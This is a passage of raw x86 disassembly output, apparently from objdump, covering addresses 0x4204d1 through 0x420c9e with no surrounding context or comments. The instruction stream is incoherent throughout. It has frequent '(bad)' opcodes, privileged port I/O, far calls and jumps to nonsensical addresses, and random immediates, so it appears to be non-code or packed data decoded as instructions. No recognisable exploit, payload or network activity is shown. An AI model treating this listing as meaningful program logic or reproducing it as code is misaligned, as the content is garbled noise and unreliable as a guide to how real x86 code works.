  4204d1:	adc    al,0x66
  4204d3:	mov    eax,0x94e2c439
  4204d8:	add    al,0xa7
  4204da:	iret   
  4204db:	mov    ecx,0xc4d2a2ae
  4204e0:	sti    
  4204e1:	pop    ecx
  4204e2:	mov    dl,0x6a
  4204e4:	xchg   esi,eax
  4204e5:	int3   
  4204e6:	add    BYTE PTR [ecx+ecx*2-0x73],cl
  4204ea:	hlt    
  4204eb:	ficomp DWORD PTR [edx+0x39]
  4204ee:	stc    
  4204ef:	mov    eax,ds:0xe006b898
  4204f4:	not    DWORD PTR [esi+edi*2-0x60]
  4204f8:	pop    esi
  4204f9:	stc    
  4204fa:	lods   eax,DWORD PTR ds:[esi]
  4204fb:	retf   
  4204fc:	mov    al,ds:0xb8c7f37c
  420501:	dec    BYTE PTR [ecx-0x75]
  420504:	rol    BYTE PTR [edx+0x116c63d6],cl
  42050a:	js     0x4204af
  42050c:	lds    ecx,FWORD PTR [ecx+0x67]
  42050f:	ds popf 
  420511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420512:	mov    dh,0xf8
  420514:	movaps xmm6,xmm7
  420517:	mov    ah,BYTE PTR [esi+0x4bfc2063]
  42051d:	fisubr DWORD PTR [esi]
  42051f:	bound  esi,QWORD PTR [ebx]
  420521:	jb     0x4204f3
  420523:	fcmovnb st,st(3)
  420525:	cmp    eax,0xca64f990
  42052a:	and    BYTE PTR [ebx],al
  42052c:	inc    edi
  42052d:	ret    
  42052e:	jae    0x420509
  420530:	mov    bh,0x17
  420532:	inc    edi
  420533:	cmp    al,0x3e
  420535:	jmp    0xf1ae506c
  42053a:	sar    DWORD PTR [edi-0x4f],1
  42053d:	(bad)  
  42053e:	repz sub eax,0x5c10347
  420544:	ins    DWORD PTR es:[edi],dx
  420545:	inc    ebp
  420546:	add    dh,BYTE PTR [edi+0x762cedcb]
  42054c:	aam    0x73
  42054e:	sbb    dh,ah
  420550:	inc    ebx
  420551:	sub    esp,DWORD PTR [eax+0x23bb413c]
  420557:	out    dx,al
  420558:	mov    ecx,0xa1a8267f
  42055d:	jp     0x4204ff
  42055f:	ss pop esi
  420561:	cmp    bl,0x9d
  420564:	cmp    al,0x61
  420566:	or     esi,0xffffffe3
  420569:	test   eax,0x7451c41
  42056e:	inc    edx
  42056f:	or     BYTE PTR [edi],bh
  420571:	mov    ebp,0x66095287
  420576:	lahf   
  420577:	adc    BYTE PTR [ebp-0x2386c08],bl
  42057d:	push   ebp
  42057e:	mov    al,ds:0xe1fa95c8
  420583:	dec    edx
  420584:	pop    ds
  420585:	fs xor eax,0xf5946e6f
  42058b:	pop    edi
  42058c:	fwait
  42058d:	xchg   edi,edi
  42058f:	iret   
  420590:	retf   
  420591:	sub    al,0x1f
  420593:	xlat   BYTE PTR ds:[ebx]
  420594:	cmp    ebp,ebp
  420596:	pop    ss
  420597:	call   esi
  420599:	inc    ecx
  42059a:	imul   esi,DWORD PTR [ecx],0x4cd1daf3
  4205a0:	idiv   BYTE PTR [ebx]
  4205a2:	dec    edi
  4205a3:	pop    edx
  4205a4:	(bad)  
  4205a6:	adc    al,0x83
  4205a8:	pop    ss
  4205a9:	outs   dx,DWORD PTR ds:[esi]
  4205aa:	ret    
  4205ab:	adc    al,0xa2
  4205ad:	pop    ebx
  4205ae:	add    al,0x5
  4205b0:	cmp    DWORD PTR [edx+0x71],eax
  4205b3:	and    al,0x4f
  4205b5:	push   esp
  4205b6:	mov    bh,0xb1
  4205b8:	mov    bl,BYTE PTR [ebx]
  4205ba:	call   0xf59222f7
  4205bf:	mov    al,0xb
  4205c1:	ret    0xaac0
  4205c4:	ins    BYTE PTR es:[edi],dx
  4205c5:	mov    esp,0x6cde7ec1
  4205ca:	xor    edi,edx
  4205cc:	popa   
  4205cd:	stos   BYTE PTR es:[edi],al
  4205ce:	data16 jb 0x4205b6
  4205d1:	cwde   
  4205d2:	sub    al,dh
  4205d4:	cli    
  4205d5:	dec    esp
  4205d6:	ja     0x420570
  4205d8:	mov    esp,0x64c81bbf
  4205dd:	pushf  
  4205de:	cmp    al,0x7c
  4205e0:	adc    eax,0xd9faa454
  4205e5:	pop    ecx
  4205e6:	(bad)  
  4205e8:	xchg   ebx,eax
  4205e9:	dec    edx
  4205ea:	sahf   
  4205eb:	jbe    0x4205ae
  4205ed:	pop    ebp
  4205ee:	inc    ebx
  4205ef:	stos   DWORD PTR es:[edi],eax
  4205f0:	sbb    eax,0xb3cbb211
  4205f5:	jae    0x4205d7
  4205f7:	inc    ebp
  4205f8:	inc    edx
  4205f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205fa:	inc    ecx
  4205fb:	fnstenv [edi]
  4205fd:	xor    al,0x1a
  4205ff:	add    eax,0x4810408
  420604:	pop    esi
  420605:	ja     0x42061c
  420607:	enter  0xcffa,0xf1
  42060b:	push   eax
  42060c:	push   esi
  42060d:	sub    edx,DWORD PTR [ebx]
  42060f:	sahf   
  420610:	leave  
  420611:	cmp    DWORD PTR [edi-0x23d8be5b],esp
  420617:	or     esi,esi
  420619:	sub    ah,dh
  42061b:	jb     0x420606
  42061d:	rcl    BYTE PTR [ebx],0xce
  420620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420621:	std    
  420622:	xchg   ebp,eax
  420623:	sub    ah,BYTE PTR [edi]
  420625:	dec    ebp
  420626:	iret   
  420627:	clc    
  420628:	sbb    BYTE PTR [edi],dl
  42062a:	rcr    BYTE PTR [edi],cl
  42062c:	call   0x20480f66
  420631:	fild   DWORD PTR [ebx+eax*4-0x6fd2ff]
  420638:	dec    esp
  420639:	xlat   BYTE PTR ds:[ebx]
  42063a:	lods   eax,DWORD PTR ds:[esi]
  42063b:	mov    ebp,0xb7502768
  420640:	js     0x420682
  420642:	pop    ebp
  420643:	push   edi
  420644:	xchg   esp,eax
  420645:	dec    edi
  420646:	outs   dx,BYTE PTR ds:[esi]
  420647:	sub    eax,0x41c73185
  42064c:	out    dx,eax
  42064d:	dec    ebx
  42064e:	inc    edx
  42064f:	add    al,0x26
  420651:	inc    ebx
  420652:	sbb    al,0xc9
  420654:	test   DWORD PTR [esi-0x3e],0x7d15b944
  42065b:	xchg   DWORD PTR [ecx+0x673a1dc1],edx
  420661:	sbb    eax,ebp
  420663:	gs enter 0xecfd,0x68
  420668:	push   ds
  420669:	aad    0x61
  42066b:	enter  0x108,0x94
  42066f:	cwde   
  420670:	adc    edx,DWORD PTR [edi+0x45]
  420673:	test   BYTE PTR [edi-0x2bff5966],bh
  420679:	mov    esi,0x394d27bf
  42067e:	repz push ds
  420680:	fs and eax,0xa8e1373a
  420686:	std    
  420687:	ins    BYTE PTR es:[edi],dx
  420688:	xchg   edi,eax
  420689:	mov    esi,0xad937ec9
  42068e:	retf   0xe145
  420691:	(bad)  
  420692:	mov    cl,0x88
  420694:	sub    cl,BYTE PTR [eax-0x6ae289fe]
  42069a:	or     ecx,edx
  42069c:	jg     0x42068c
  42069e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42069f:	out    0x73,al
  4206a1:	pusha  
  4206a2:	ret    
  4206a3:	(bad)  
  4206a4:	dec    esp
  4206a5:	xor    al,0xd8
  4206a7:	int    0x59
  4206a9:	je     0x420728
  4206ab:	or     eax,0xd126972f
  4206b0:	ja     0x4206f1
  4206b2:	(bad)  
  4206b3:	out    0x7,al
  4206b5:	leave  
  4206b6:	jno    0x8e42a48a
  4206bc:	push   ecx
  4206bd:	int    0x95
  4206bf:	call   0x9893:0x10a12f3
  4206c6:	(bad)  
  4206c7:	and    DWORD PTR [esi-0x2b],ebp
  4206ca:	xchg   esi,eax
  4206cb:	mov    dh,0xce
  4206cd:	push   ebp
  4206ce:	repnz (bad) 
  4206d0:	mov    BYTE PTR [ebp-0x40],ah
  4206d3:	mov    bl,0x6
  4206d5:	mov    bl,0x90
  4206d7:	(bad)  
  4206d8:	pushf  
  4206d9:	in     eax,0x8
  4206db:	mov    edi,DWORD PTR [ebp+ebp*2+0x6b]
  4206df:	jl     0x4206ad
  4206e1:	shl    DWORD PTR [edi-0x2dc74756],cl
  4206e7:	rcr    esp,1
  4206e9:	ja     0x420745
  4206eb:	cdq    
  4206ec:	dec    ebx
  4206ed:	stos   DWORD PTR es:[edi],eax
  4206ee:	nop
  4206ef:	cmp    BYTE PTR [eax+edx*8],cl
  4206f2:	or     BYTE PTR [di+0x7f5f],bh
  4206f7:	or     eax,0x24d9de58
  4206fc:	or     DWORD PTR [edi+eax*2-0xf],esp
  420700:	hlt    
  420701:	sub    dl,BYTE PTR [ebp-0xf]
  420704:	lods   eax,DWORD PTR ds:[esi]
  420705:	aaa    
  420706:	push   edx
  420707:	ins    BYTE PTR es:[edi],dx
  420708:	ins    DWORD PTR es:[edi],dx
  420709:	mov    ebp,0xa6a74f16
  42070e:	sbb    al,BYTE PTR [ebx+ecx*1-0x1]
  420712:	push   0xffffff82
  420714:	push   ebp
  420715:	push   ds
  420716:	xchg   esi,eax
  420717:	ds jno 0x420770
  42071a:	xchg   DWORD PTR [eax+ebp*4],ecx
  42071d:	pop    es
  42071e:	cmp    DWORD PTR [ebp+0x57b915ea],0xffffffb3
  420725:	out    dx,al
  420726:	adc    BYTE PTR [bp+0x4437],cl
  42072b:	leave  
  42072c:	icebp  
  42072d:	stos   BYTE PTR es:[edi],al
  42072e:	loop   0x4206d4
  420730:	mov    gs,WORD PTR [ecx+esi*8-0x6d]
  420734:	mov    ds:0x9ff022f0,eax
  420739:	adc    dh,BYTE PTR [eax-0x51]
  42073c:	(bad)  
  42073d:	cs mov bl,0x71
  420740:	scas   al,BYTE PTR es:[edi]
  420741:	pop    eax
  420742:	inc    esp
  420743:	pop    eax
  420744:	push   ecx
  420745:	test   BYTE PTR [ecx-0x6a4632a1],bl
  42074b:	push   edx
  42074c:	into   
  42074d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074e:	jne    0x4206e9
  420750:	jecxz  0x42074a
  420752:	push   0x57aaba66
  420757:	inc    ecx
  420758:	nop
  420759:	fcmovnu st,st(5)
  42075b:	pop    eax
  42075c:	adc    BYTE PTR ds:0xf3e34dcd,bl
  420762:	sbb    DWORD PTR [ebp-0x76],0xffffff9d
  420766:	and    DWORD PTR [ebx-0x7d],ebp
  420769:	mov    ecx,0x3dbca9ef
  42076e:	mov    bh,0x1d
  420770:	call   0xf13d4e72
  420775:	jae    0x4207b6
  420777:	jne    0x4207d1
  420779:	out    dx,eax
  42077a:	mov    cl,0xab
  42077c:	mov    esp,0xcd493e5e
  420781:	leave  
  420782:	cmp    al,0x57
  420784:	aaa    
  420785:	pushf  
  420786:	fsubr  DWORD PTR [esp+ecx*8-0x37]
  42078a:	inc    ebx
  42078b:	aam    0x54
  42078d:	inc    esi
  42078e:	fisttp WORD PTR [edx]
  420790:	xor    al,0x63
  420792:	push   esp
  420793:	jmp    0x839c:0x1920d484
  42079a:	stos   BYTE PTR es:[edi],al
  42079b:	outs   dx,BYTE PTR ds:[esi]
  42079c:	loop   0x420722
  42079e:	mov    cl,0x62
  4207a0:	outs   dx,DWORD PTR ds:[esi]
  4207a1:	(bad)  
  4207a2:	or     DWORD PTR ss:[edi-0x56],0x2fa4dd9b
  4207aa:	sub    ebx,DWORD PTR [ebp+0x72a1796c]
  4207b0:	cmp    BYTE PTR [ecx],bl
  4207b2:	dec    edi
  4207b3:	shl    DWORD PTR [ecx+0x32a745e9],cl
  4207b9:	retf   0x5daf
  4207bc:	pop    esp
  4207bd:	or     eax,DWORD PTR [esi-0x1c25765c]
  4207c3:	or     al,0xb9
  4207c5:	(bad)  
  4207c6:	daa    
  4207c7:	retf   
  4207c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207c9:	adc    eax,0xd3477a68
  4207ce:	shl    BYTE PTR [edx+0xc16cb0a],0xa6
  4207d5:	icebp  
  4207d6:	lds    esp,FWORD PTR [eax+0xc]
  4207d9:	pop    ecx
  4207da:	mov    gs,esi
  4207dc:	fst    QWORD PTR [edx-0x175894b6]
  4207e2:	test   DWORD PTR [ecx],0xfc81522c
  4207e8:	mov    ecx,0x2dce0969
  4207ed:	jl     0x42081b
  4207ef:	in     al,dx
  4207f0:	leave  
  4207f1:	cmp    al,0x76
  4207f3:	ret    
  4207f4:	pop    es
  4207f5:	mov    ebx,0x7c3225cc
  4207fa:	(bad)  
  4207fb:	in     eax,dx
  4207fc:	jl     0x42080b
  4207fe:	fisttp QWORD PTR [ebx-0x15540251]
  420804:	xchg   ecx,eax
  420805:	inc    ebx
  420806:	call   0x1241:0x1b3ad2ae
  42080d:	xor    al,0x97
  42080f:	scas   eax,DWORD PTR es:[edi]
  420810:	adc    edi,esi
  420812:	mov    edi,0xb5849e19
  420817:	push   esp
  420818:	mov    eax,0xbdc175e4
  42081d:	mov    edx,0xfba6d417
  420822:	stc    
  420823:	or     eax,DWORD PTR [ecx-0x4b]
  420826:	pusha  
  420827:	sub    esi,DWORD PTR [ecx]
  420829:	adc    esp,DWORD PTR [ecx]
  42082b:	mov    ebp,ebp
  42082d:	iret   
  42082e:	dec    ebp
  42082f:	or     BYTE PTR [edi],al
  420831:	gs iret 
  420833:	push   esi
  420834:	and    BYTE PTR [edi],0x0
  420837:	es cmp bl,ch
  42083a:	xchg   edi,eax
  42083b:	jmp    0x42081f
  42083d:	je     0x420858
  42083f:	inc    esp
  420840:	adc    bl,BYTE PTR ds:0x663a7dc1
  420846:	push   cs
  420847:	jmp    0xca90f853
  42084c:	mov    WORD PTR [edx+0x7a],es
  42084f:	pop    es
  420850:	mov    ecx,0x57b845c1
  420855:	xchg   DWORD PTR [edi-0x14544d41],edi
  42085b:	xor    dh,BYTE PTR [eax-0x2478df8f]
  420861:	mov    ebp,0x82ce04df
  420866:	pop    ebp
  420867:	push   edx
  420868:	xchg   ebp,eax
  420869:	mov    BYTE PTR [edx-0x1f],bh
  42086c:	sbb    bl,al
  42086e:	push   ebx
  42086f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420870:	int3   
  420871:	or     eax,esp
  420873:	div    BYTE PTR [edi-0x65]
  420876:	cs inc edx
  420878:	cmp    BYTE PTR [ebp+0x1dd9ab4c],cl
  42087e:	mov    al,0x32
  420880:	ins    DWORD PTR es:[edi],dx
  420881:	xchg   ebx,eax
  420882:	jmp    0x4208c2
  420884:	int    0x10
  420886:	push   cs
  420887:	cld    
  420888:	repz rcl bh,0x1f
  42088c:	or     al,0xcf
  42088e:	(bad)  
  42088f:	push   ebx
  420890:	test   eax,0x8f825a6b
  420895:	add    bh,BYTE PTR [edi+0x24b8cbfc]
  42089b:	sti    
  42089c:	jmp    0xb6f1:0xa46096cb
  4208a3:	pushw  0x2a6
  4208a7:	lods   al,BYTE PTR ds:[esi]
  4208a8:	or     ecx,esi
  4208aa:	add    al,BYTE PTR [esp+ebp*4-0x35]
  4208ae:	adc    al,0x45
  4208b0:	push   0x9aa3f6a
  4208b5:	jmp    0x35de7cc2
  4208ba:	pop    edx
  4208bb:	ins    BYTE PTR es:[edi],dx
  4208bc:	mov    al,ds:0x11be4f9c
  4208c1:	lock les eax,FWORD PTR [esi]
  4208c4:	add    edx,esp
  4208c6:	pop    es
  4208c7:	cmc    
  4208c8:	push   ecx
  4208c9:	fbld   TBYTE PTR [edi-0x7695336b]
  4208cf:	stos   DWORD PTR es:[edi],eax
  4208d0:	jl     0x42085e
  4208d2:	xchg   edi,eax
  4208d3:	(bad)  
  4208d4:	fcomp  st(3)
  4208d6:	stos   BYTE PTR es:[edi],al
  4208d7:	inc    esi
  4208d8:	pop    ebp
  4208d9:	push   esi
  4208da:	mov    esi,DWORD PTR [eax]
  4208dc:	jl     0x4208a7
  4208de:	xchg   ecx,eax
  4208df:	mov    ebx,0x83f0b2c3
  4208e4:	shl    DWORD PTR [ecx+0x36],1
  4208e7:	into   
  4208e8:	sub    eax,0x3fa8f707
  4208ed:	lahf   
  4208ee:	(bad)  
  4208ef:	out    0xb1,eax
  4208f1:	aam    0x9a
  4208f3:	and    al,0x2d
  4208f5:	pushf  
  4208f6:	adc    DWORD PTR [ecx],edx
  4208f8:	in     al,dx
  4208f9:	pusha  
  4208fa:	inc    edx
  4208fb:	inc    ebp
  4208fc:	loopne 0x42089c
  4208fe:	ins    BYTE PTR es:[edi],dx
  4208ff:	je     0x4208e6
  420901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420902:	xchg   DWORD PTR [edi-0x12],eax
  420905:	hlt    
  420906:	fsubr  QWORD PTR [ebp+0x64de88d6]
  42090c:	into   
  42090d:	pop    ecx
  42090e:	stc    
  42090f:	dec    ebp
  420910:	dec    esi
  420911:	hlt    
  420912:	in     al,0x14
  420914:	mov    ch,0xfc
  420916:	jb     0x4208b0
  420918:	jp     0x4208db
  42091a:	and    DWORD PTR [ebp+0x66],esi
  42091d:	retf   
  42091e:	pushf  
  42091f:	dec    edi
  420920:	push   ds
  420921:	dec    esi
  420922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420923:	fbstp  TBYTE PTR [eax]
  420925:	cs sub al,0x46
  420928:	ss aas 
  42092a:	push   es
  42092b:	pop    ss
  42092c:	pop    esi
  42092d:	xor    eax,0x4833b66c
  420932:	imul   eax,ebx,0xf68b3a2a
  420938:	ror    DWORD PTR [ebp+0x32],1
  42093b:	and    eax,0xe7094efb
  420940:	inc    ecx
  420941:	and    al,0xb4
  420943:	test   BYTE PTR [ecx+0x30],0x15
  420947:	inc    eax
  420948:	sbb    dh,BYTE PTR [edx]
  42094a:	push   edi
  42094b:	and    edi,DWORD PTR [esp+ebp*8+0x76c52ef0]
  420952:	ins    BYTE PTR es:[edi],dx
  420953:	dec    esp
  420954:	inc    edi
  420955:	test   al,0xe2
  420957:	sti    
  420958:	or     dl,BYTE PTR [ebp+0x2e045842]
  42095e:	call   0xd97269c1
  420963:	dec    ebx
  420964:	mov    bl,0xa0
  420966:	cmc    
  420967:	(bad)
  42096b:	sbb    esp,DWORD PTR [ecx]
  42096d:	loope  0x420958
  42096f:	add    BYTE PTR [edi],ch
  420971:	gs jns 0x4208f9
  420974:	fst    QWORD PTR [eax+edi*1-0x53]
  420978:	popa   
  420979:	lock mov ecx,0xf38c032e
  42097f:	mov    edx,DWORD PTR [edi*4+0x6cc4189d]
  420986:	mov    eax,ss:0x7af54a2e
  42098c:	bound  ebp,QWORD PTR [edx+ebp*4-0x6d]
  420990:	lahf   
  420991:	loopne 0x420975
  420993:	pop    ss
  420994:	mov    dl,0xe2
  420996:	or     DWORD PTR [eax+0x5729c94b],0xffffffc6
  42099d:	mov    WORD PTR [ebp-0x39],fs
  4209a0:	aad    0x3d
  4209a2:	adc    BYTE PTR [eax+0x50065a0e],0x42
  4209a9:	xor    al,0x35
  4209ab:	in     al,dx
  4209ac:	inc    eax
  4209ad:	pop    ebx
  4209ae:	pushf  
  4209af:	popa   
  4209b0:	or     dl,bl
  4209b2:	push   ebp
  4209b3:	enter  0xb708,0xc1
  4209b7:	push   eax
  4209b8:	fsubr  st(2),st
  4209ba:	add    BYTE PTR [edi],bh
  4209bc:	test   al,0xfd
  4209be:	shl    BYTE PTR [ebx+0x57],0x7f
  4209c2:	xchg   edx,eax
  4209c3:	adc    esi,DWORD PTR [ebx-0x34a268dd]
  4209c9:	mov    ebx,ebp
  4209cb:	fisttp DWORD PTR [edi+edx*4-0x6]
  4209cf:	ds (bad) 
  4209d1:	ins    BYTE PTR es:[edi],dx
  4209d2:	jae    0x420962
  4209d4:	call   0xcd30bca7
  4209d9:	push   cs
  4209da:	mov    esi,0x7e9ad2d3
  4209df:	in     al,dx
  4209e0:	pop    eax
  4209e1:	xchg   edx,eax
  4209e2:	cli    
  4209e3:	stc    
  4209e4:	mov    bl,0xb7
  4209e6:	(bad)  
  4209e8:	push   ecx
  4209e9:	scas   al,BYTE PTR es:[edi]
  4209ea:	jmp    0x420a6b
  4209ec:	mov    esi,fs
  4209ee:	adc    edx,DWORD PTR [ebx+eax*2-0x11d8d2d4]
  4209f5:	popf   
  4209f6:	inc    esp
  4209f7:	fs (bad) 
  4209f9:	test   eax,0xed9b76ef
  4209fe:	xor    eax,ecx
  420a00:	jp     0x4209c4
  420a02:	out    dx,al
  420a03:	jo     0x420a33
  420a05:	cmp    dl,BYTE PTR [eax]
  420a07:	xor    BYTE PTR [ebp-0x218fef8b],0x2c
  420a0e:	mov    ch,BYTE PTR ds:0x39c18ff9
  420a14:	push   0x91387c87
  420a19:	mov    edi,0xacc90e78
  420a1e:	test   DWORD PTR [esi+0x5b35e69d],eax
  420a24:	ss fsub st(6),st
  420a27:	test   eax,0xf6ebca70
  420a2c:	(bad)
  420a2f:	jl     0x420a6e
  420a31:	mov    DWORD PTR [ebp-0x6b4f571f],0x44a330b1
  420a3b:	push   ss
  420a3c:	out    0xdb,al
  420a3e:	bound  ebp,QWORD PTR [ebp+0x6c0ec3d9]
  420a44:	inc    ecx
  420a45:	out    0x9f,eax
  420a47:	lea    ecx,[ebx+0x2]
  420a4a:	mov    ebp,0xd384bb54
  420a4f:	add    ah,al
  420a51:	sbb    ah,BYTE PTR [eax-0x3d]
  420a54:	aam    0xed
  420a56:	xchg   ebx,eax
  420a57:	sti    
  420a58:	add    eax,0x65b40d32
  420a5d:	sti    
  420a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a5f:	or     DWORD PTR [ebp+0x3d615bf6],0xa44e2e70
  420a69:	push   edi
  420a6a:	push   ebx
  420a6b:	jecxz  0x420aa2
  420a6d:	stos   BYTE PTR es:[edi],al
  420a6e:	pop    eax
  420a6f:	test   eax,0xbc48c04e
  420a74:	xchg   ebp,eax
  420a75:	push   esp
  420a76:	(bad)  
  420a77:	jmp    DWORD PTR [esi-0x20]
  420a7a:	mov    esp,0x6aeadd2a
  420a7f:	loopne 0x420a83
  420a81:	mov    ecx,0x22fd42e5
  420a86:	call   0x966df68b
  420a8b:	outs   dx,DWORD PTR es:[esi]
  420a8d:	add    BYTE PTR ds:0x6920d8b7,ch
  420a93:	lods   al,BYTE PTR ds:[esi]
  420a94:	call   0xa444:0xa6a6d580
  420a9b:	orps   xmm4,XMMWORD PTR [ecx-0x59]
  420a9f:	jnp    0x420ab3
  420aa1:	pop    ds
  420aa2:	test   al,0x13
  420aa4:	stc    
  420aa5:	xor    eax,DWORD PTR [esi-0x73]
  420aa8:	inc    ecx
  420aa9:	rcl    DWORD PTR [edx-0x32854cfb],1
  420aaf:	mov    esp,0xe26a6472
  420ab4:	push   0x6a
  420ab6:	and    al,0x9b
  420ab8:	(bad)  
  420ab9:	push   ebx
  420aba:	test   eax,0xbc66afab
  420abf:	cmp    edx,DWORD PTR [ebp-0x796ec113]
  420ac5:	daa    
  420ac6:	jnp    0x420a66
  420ac8:	inc    edx
  420ac9:	in     eax,0xa8
  420acb:	lds    ebx,FWORD PTR [ebp+0x5d]
  420ace:	and    BYTE PTR [ecx],dh
  420ad0:	dec    ebx
  420ad1:	shl    DWORD PTR [edx+0x5877917a],1
  420ad7:	pop    esi
  420ad8:	lahf   
  420ad9:	pushf  
  420ada:	sub    BYTE PTR [ebx],0x22
  420add:	mov    ch,0x2
  420adf:	out    0xe5,eax
  420ae1:	pusha  
  420ae2:	es add eax,0x948fc502
  420ae8:	push   0x66
  420aea:	jno    0x420ae0
  420aec:	add    eax,0x26eb4f12
  420af1:	popa   
  420af2:	sub    eax,0x44096428
  420af7:	xchg   ecx,eax
  420af8:	inc    edx
  420af9:	shl    BYTE PTR [ebp+0x5b49041],1
  420aff:	stos   BYTE PTR es:[edi],al
  420b00:	in     eax,0x61
  420b02:	ficomp DWORD PTR [eax+0x34]
  420b05:	(bad)  
  420b06:	fdiv   QWORD PTR [ebx+edi*4]
  420b09:	ja     0x420b7c
  420b0b:	cmp    bl,BYTE PTR [ecx+eiz*2]
  420b0e:	(bad)  ss:[edx-0x5ed6a028]
  420b15:	retf   
  420b16:	pusha  
  420b17:	cmp    BYTE PTR [ebx+0x128a1ce5],0x5f
  420b1e:	leave  
  420b1f:	cli    
  420b20:	xchg   al,bl
  420b22:	pmulhw mm6,QWORD PTR [edx+0x2047d7a3]
  420b29:	push   es
  420b2a:	push   esp
  420b2b:	adc    eax,0x135a71ba
  420b30:	or     ch,BYTE PTR ds:0xe9f33382
  420b36:	push   ss
  420b37:	ja     0x420b48
  420b39:	or     eax,0x51105781
  420b3e:	cmp    dh,bh
  420b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b41:	add    edx,DWORD PTR [edx-0x22]
  420b44:	(bad)  [eax-0x4bb0b222]
  420b4a:	mov    edx,0xf0c5c50b
  420b4f:	jl     0x420b8a
  420b51:	ja     0x420b8f
  420b53:	int3   
  420b54:	gs push ecx
  420b56:	dec    edx
  420b57:	cmp    BYTE PTR [esp+eax*1],bl
  420b5a:	dec    ecx
  420b5b:	or     BYTE PTR [edx+0x2b9b64c8],0xd2
  420b62:	mov    cl,0xa1
  420b64:	mov    dl,al
  420b66:	mov    edx,0x40f109f5
  420b6b:	ffree  st(2)
  420b6d:	scas   eax,DWORD PTR es:[edi]
  420b6e:	stos   DWORD PTR es:[edi],eax
  420b6f:	fdiv   QWORD PTR [ecx+0x31]
  420b72:	inc    esi
  420b73:	mov    dl,0x2e
  420b75:	dec    ebp
  420b76:	mov    edi,0xee934809
  420b7b:	cmp    edx,ebx
  420b7d:	ja     0x420b6f
  420b7f:	mov    al,0xb6
  420b81:	test   al,0x6f
  420b83:	es es call 0xcb192ace
  420b8a:	pop    ss
  420b8b:	fisttp WORD PTR [edi+edx*2]
  420b8e:	ja     0x420b74
  420b90:	popf   
  420b91:	push   0x1f0ebfea
  420b96:	push   eax
  420b97:	(bad)  
  420b99:	or     esp,ecx
  420b9b:	pop    edi
  420b9c:	lods   al,BYTE PTR ds:[esi]
  420b9d:	pop    edx
  420b9e:	frstor [ecx-0x2f]
  420ba1:	int    0x61
  420ba3:	leave  
  420ba4:	mov    esp,DWORD PTR [edi+0x51afb54b]
  420baa:	pop    ss
  420bab:	push   0x30e11211
  420bb0:	(bad)  
  420bb2:	sub    ch,BYTE PTR [ebx-0x17]
  420bb5:	jo     0x420b5b
  420bb7:	out    0xc6,eax
  420bb9:	push   edx
  420bba:	mov    WORD PTR [ebx],gs
  420bbc:	out    0x3a,al
  420bbe:	fsubr  QWORD PTR [ecx]
  420bc0:	loop   0x420bdf
  420bc2:	and    WORD PTR [ecx+0x2cb1d1a3],bx
  420bc9:	cdq    
  420bca:	in     eax,dx
  420bcb:	test   al,0xaa
  420bcd:	xlat   BYTE PTR ds:[ebx]
  420bce:	jbe    0x420c19
  420bd0:	sub    dh,0xcf
  420bd3:	aad    0x79
  420bd5:	sub    cl,BYTE PTR [ecx-0x5]
  420bd8:	add    bl,bl
  420bda:	adc    esi,DWORD PTR [eax+0xb]
  420bdd:	inc    ebx
  420bde:	popf   
  420bdf:	push   eax
  420be0:	or     bl,dh
  420be2:	mov    WORD PTR [eax-0x1a],cs
  420be5:	hlt    
  420be6:	retf   0x16d5
  420be9:	cld    
  420bea:	sub    dh,cl
  420bec:	xchg   ebx,eax
  420bed:	or     edx,ebp
  420bef:	repnz mov DWORD PTR [ecx-0x47],edx
  420bf3:	mov    ds:0x56b2f1c9,al
  420bf8:	je     0x420bf3
  420bfa:	inc    ecx
  420bfb:	cwde   
  420bfc:	or     edx,DWORD PTR [edx-0x30717ac4]
  420c02:	shl    BYTE PTR [ebx-0x7f08cd94],1
  420c08:	data16 adc BYTE PTR [ecx+eax*4],ah
  420c0c:	mov    edi,0x543e5e3f
  420c11:	add    edx,DWORD PTR [edx]
  420c13:	push   edx
  420c14:	xchg   esp,eax
  420c15:	sbb    ebx,DWORD PTR [edi*8+0xbc593ed]
  420c1c:	dec    esi
  420c1d:	push   ebp
  420c1e:	mov    WORD PTR [esi-0x2],cs
  420c21:	arpl   WORD PTR [esi+esi*2],bx
  420c24:	xor    eax,0xa5bd7615
  420c29:	or     ch,ah
  420c2b:	jecxz  0x420c11
  420c2d:	scas   al,BYTE PTR es:[edi]
  420c2e:	mov    edx,?
  420c30:	int    0xcd
  420c32:	cmp    al,0x37
  420c34:	inc    esi
  420c35:	jl     0x420cb0
  420c37:	clc    
  420c38:	stos   DWORD PTR es:[edi],eax
  420c39:	stc    
  420c3a:	lods   eax,DWORD PTR ds:[esi]
  420c3b:	or     eax,0xfe31324a
  420c40:	inc    esp
  420c41:	xchg   ebp,eax
  420c42:	ins    DWORD PTR es:[edi],dx
  420c43:	fsub   st(3),st
  420c45:	xchg   edi,eax
  420c46:	add    DWORD PTR [ebx-0x28],ecx
  420c49:	sub    eax,0x5d094684
  420c4e:	sti    
  420c4f:	push   ss
  420c50:	imul   ebx,DWORD PTR [eax],0xbee9c61a
  420c56:	mov    bh,0xba
  420c58:	(bad)  
  420c59:	fdivr  QWORD PTR [esp+esi*2+0x15c7bed3]
  420c60:	test   DWORD PTR [edx+0x76],0xad26e3d7
  420c67:	ret    0x1591
  420c6a:	or     eax,DWORD PTR [eax]
  420c6c:	ror    DWORD PTR [esp+ebp*4-0xd],1
  420c70:	aaa    
  420c71:	or     edx,DWORD PTR [esp+esi*1]
  420c74:	mov    edi,0x98780c28
  420c79:	adc    eax,0xd16b503b
  420c7e:	popf   
  420c7f:	aas    
  420c80:	ds inc ecx
  420c82:	jmp    0xed07:0xe72a6c9f
  420c89:	call   0xc08370e7
  420c8e:	fisub  DWORD PTR [ebx-0x4e]
  420c91:	cld    
  420c92:	xor    DWORD PTR [esi+eax*1+0x1b],eax
  420c96:	in     eax,0x11
  420c98:	scas   eax,DWORD PTR es:[edi]
  420c99:	mov    ds:0x1bd0d8a,eax
  420c9e:	shl    dl,cl
